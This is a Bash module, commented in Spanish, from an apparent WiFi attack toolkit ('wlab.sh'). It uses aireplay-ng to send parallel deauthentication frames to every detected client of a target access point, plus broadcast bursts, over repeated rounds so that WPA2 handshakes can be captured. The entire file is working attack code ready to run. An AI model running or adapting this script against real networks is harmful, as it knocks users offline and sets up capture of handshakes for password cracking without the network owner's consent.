#!/usr/bin/env bash
# lib/deauth.sh — Ataque de desautenticación para forzar handshake WPA2
# No ejecutar directamente. Cargado por wlab.sh
#
# DISEÑO — TODOS LOS CLIENTES EN PARALELO:
# ─────────────────────────────────────────
# Cada cliente recibe su propio proceso aireplay-ng lanzado en background
# simultáneamente. 1 cliente o 1000 → mismo mecanismo, misma ráfaga.
# Al final de cada ronda se hace wait de todos antes de la siguiente.
# run_deauth termina inmediatamente cuando capture.sh hace kill $deauth_pid.

# _deauth_burst: una ronda completa — todos los clientes + broadcast en paralelo.
_deauth_burst() {
    local round="$1" log_file="$2"
    shift 2
    local -a macs=("$@")
    local -a pids=()

    dbg "── Ronda ${round}: deauth paralelo a $(( ${#macs[@]} + 1 )) target(s) ──"

    # Un proceso por cliente, todos simultáneos
    for mac in "${macs[@]}"; do
        dbg "  [parallel] dirigido → ${mac}"
        aireplay-ng \
            --deauth "$DEAUTH_N" \
            -a "$TARGET" \
            -c "$mac" \
            "$MON" >> "$log_file" 2>&1 &
        pids+=($!)
    done

    # Broadcast siempre, en paralelo con los dirigidos
    dbg "  [parallel] broadcast → AP ${TARGET}"
    aireplay-ng \
        --deauth "$DEAUTH_N" \
        -a "$TARGET" \
        "$MON" >> "$log_file" 2>&1 &
    pids+=($!)

    # Esperar a que todos terminen antes de la siguiente ronda
    for pid in "${pids[@]}"; do
        wait "$pid" 2>/dev/null || true
    done

    dbg "  Ronda ${round} completada."
}

# run_deauth: carga clientes, lanza el ciclo de rondas en background.
# Imprime el PID del subshell a stdout para que capture.sh lo pueda matar.
run_deauth() {
    local log_file="$1"
    local -a client_macs=()

    while IFS= read -r mac; do
        [[ -n "$mac" ]] && client_macs+=("$mac")
    done < <(get_client_macs)

    local n=${#client_macs[@]}
    if (( n > 0 )); then
        info "Deauth paralelo: ${n} cliente(s) + broadcast  (${DEAUTH_ROUNDS} ronda(s))"
        for mac in "${client_macs[@]}"; do
            info "  → ${mac}"
        done
    else
        warn "Sin clientes — deauth broadcast únicamente  (${DEAUTH_ROUNDS} ronda(s))."
    fi

    (
        for r in $(seq 1 "$DEAUTH_ROUNDS"); do
            _deauth_burst "$r" "$log_file" "${client_macs[@]}"
            (( r < DEAUTH_ROUNDS )) && sleep "$DEAUTH_INTERVAL"
        done
        dbg "Ciclo deauth completado (${DEAUTH_ROUNDS} rondas)."
    ) &

    echo $!
}
